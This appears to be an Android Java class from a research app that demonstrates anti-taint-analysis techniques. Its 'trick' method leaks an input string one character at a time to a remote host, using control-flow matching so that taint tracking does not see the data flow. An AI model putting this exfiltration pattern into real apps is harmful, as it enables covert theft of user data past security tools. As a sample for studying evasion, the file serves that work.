package com.inayoshi.atatechniques.controldependencies;

import android.util.Log;

import com.inayoshi.atatechniques.MainActivity;
import com.inayoshi.atatechniques.Server;

public class RemoteControl {
    public static String trick(String in) {
        String out = "";
        String symbols = "0123456789abcdefghijklmnopqrstuvwxyz" +
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ~`!@#$%^&*()-=_+[]{}" +
                "\\|;',./:\"<>?";

        for (int i = 0; i < in.length(); i++) {
            for (int j = 0; j < symbols.length(); j++) {
                if (in.charAt(i) == symbols.charAt(j)) {
                    try {
                        new Server(MainActivity.hostIPAddr, MainActivity.hostPort).execute(String.valueOf(symbols.charAt(j))).get();
                    } catch (Exception e) {
                        Log.i(MainActivity.TAG, Log.getStackTraceString(e));
                    }
                }
            }
        }

        return out;
    }
}
